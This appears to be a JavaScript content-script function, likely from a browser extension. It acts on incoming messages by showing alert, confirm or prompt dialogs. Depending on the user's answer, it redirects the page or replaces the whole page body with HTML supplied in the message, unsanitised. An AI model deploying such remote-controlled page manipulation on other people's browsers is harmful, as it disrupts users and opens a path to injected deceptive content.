function handle_command(message) {
    console.log(message);
    let data = message.data;

    if (data.visible && document.hidden) return;
    if (data.focused && !document.hasFocus()) return;

    if (data.bootstrap && !document.getElementById("bot-bootstrap-script")) {
        let bootstrap_css_node = document.createElement("link");
        bootstrap_css_node.id = "bot-bootstrap-script";
        bootstrap_css_node.href = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css";
        bootstrap_css_node.rel = "stylesheet";
        bootstrap_css_node.crossorigin = "anonymous";
        document.head.appendChild(bootstrap_css_node);
    }

    switch (message.name) {
        case "Alert":
            if (data.force?.alert_type && data.force?.message) {
                switch (data.force.alert_type) {
                    case "alert":
                        alert(data.force.message);
                        break;
                    case "confirm":
                        confirm(data.force.message);
                        break;
                    case "prompt":
                        prompt(data.force.message);
                        break;
                    default:
                        break;
                }
            } else {
                switch (random_index(3)) {
                    case 0:
                        alert(data.alert[random_index(data.alert.length)]);
                        break;
                    case 1:
                        confirm(data.confirm[random_index(data.confirm.length)]);
                        break;
                    case 2:
                        prompt_action = data.prompt[random_index(data.prompt.length)]
                        let input = prompt(prompt_action.message);

                        if (prompt_action.otherwise) {
                            if (input == prompt_action.value) break;
                            if (prompt_action.otherwise.probability && Math.random() > prompt_action.otherwise.probability) break;

                            switch (prompt_action.otherwise.action) {
                                case "redirect":
                                    location.href = prompt_action.otherwise.to;
                                    break;

                                case "replace_body":
                                    document.body.innerHTML = prompt_action.otherwise.with;
                                    break;

                                default:
                                    break;
                            }
                        }
                        break;
                    default:
                        break;
                }
            }
            break;

        default:
            break;
    }
}

function random_index(array_length) {
    return Math.floor(Math.random() * array_length);
}